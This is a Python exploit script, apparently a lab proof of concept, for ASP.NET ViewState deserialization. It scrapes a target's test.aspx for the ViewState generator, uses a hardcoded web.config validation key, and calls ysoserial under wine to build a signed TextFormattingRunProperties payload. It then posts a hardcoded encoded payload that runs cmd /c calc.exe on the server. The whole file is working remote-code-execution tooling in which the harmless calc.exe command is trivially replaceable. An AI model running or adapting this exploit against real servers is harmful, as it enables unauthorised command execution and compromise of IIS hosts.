#!/usr/bin/python3
import requests
import re
import base64
import sys
import subprocess

target = sys.argv[1]

# Hardcoded validation key from web.config
validation_key = "C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"



def get_viewstate_generator(target):
    #pattern = 'name=\"__VIEWSTATE\" value=\"(?P<viewstate_b64>[a-zA-Z0-9+\=\_\/])\"'
    viewstate_pattern = r'id="__VIEWSTATE"\svalue="(?P<viewstate_b64>[a-zA-Z0-9+=_/]{3,128})"'
    generator_pattern = r'id="__VIEWSTATEGENERATOR"\svalue="(?P<generator_hex>[a-fA-F0-9]{8})"'
    
    resp = requests.get(f'http://{target}:80/test.aspx')
    #Regex match to search for base64 encoded VIEWSTATE string
    viewstate_match = re.search(viewstate_pattern, resp.text)
    generator_match = re.search(generator_pattern, resp.text)
    if viewstate_match and generator_match:
        viewstate_dict = viewstate_match.groupdict()
        generator_dict = generator_match.groupdict()
        if viewstate_dict['viewstate_b64']:
            viewstate_data = viewstate_dict['viewstate_b64']
        if generator_dict['generator_hex']:
            generator_data = generator_dict['generator_hex']
        
#        print(f"ViewState: {viewstate_data} , Generator: {generator_data}")

        return viewstate_data, generator_data

def gen_payload(validation_key, generator):
    y_so_serial_proc = subprocess.Popen([
        'wine', 'Release/ysoserial.exe',  '-p', 'ViewState', '-g', 'TextFormattingRunProperties', '--generator', f'{generator}',
        '--validationalg', 'SHA1', '--validationkey', f'{validation_key}', '-c', '"calc.exe"'
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    payload, stderr = y_so_serial_proc.communicate()
#    wine Release/ysoserial.exe -p ViewState -g TextFormattingRunProperties --generator 75BBA7D6 --validationalg SHA1 --validationkey C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45 -c "calc.exe"

    return payload.decode('ascii')


def send_payload(target, payload, generator):
#    post_body = f"__VIEWSTATE={payload}&__VIEWSTATEGENERATOR={generator}&__EVENTVALIDATION=%2FwEdAAPnl6wVKHtwLP1RW89DHL5MsiEMikfqxcx1nOQxwn%2BULjzmltaUM7aEAN%2Bg9cP%2Fm12iU74N73opqX8Vr4w5q4Cdrd7F4A%3D%3D&txtInput=hello&btnSubmit=Submit"

    post_body = "__VIEWSTATE=%2FwEyoQcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADDBTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgJnF1b3Q7Y2FsYy5leGUmcXVvdDsiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M%2BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI%2BC9gakR9AxCTKRjxKVb0NJVIwyjN%2F&__VIEWSTATEGENERATOR=75BBA7D6&txtInput=hello&btnSubmit=Submit"
#    print(post_body)
    headers = {"User-Agent": "Mozilla/5.0",
               "Connection": "keep-alive",
               "Content-Type": "application/x-www-form-urlencoded"
               }
    
    resp = requests.post(f"http://{target}:80/test.aspx", headers=headers, data=post_body)
    if resp.status_code == 500:
        print("Received 500 Internal Server Error, payload possibly successful")
        print("Check 4688 event logs on target server to see if calc.exe spawned")

        return True
    else:
        print(resp.status_code)
        return False



def main():
    viewstate, generator = get_viewstate_generator(target)
    print(f"ViewState: {viewstate} , Generator: {generator}")
    payload = gen_payload(validation_key, generator)
    print(f"Payload Data: {payload}")
    print("Sending payload ...")
    send_payload(target, payload, generator)

main()

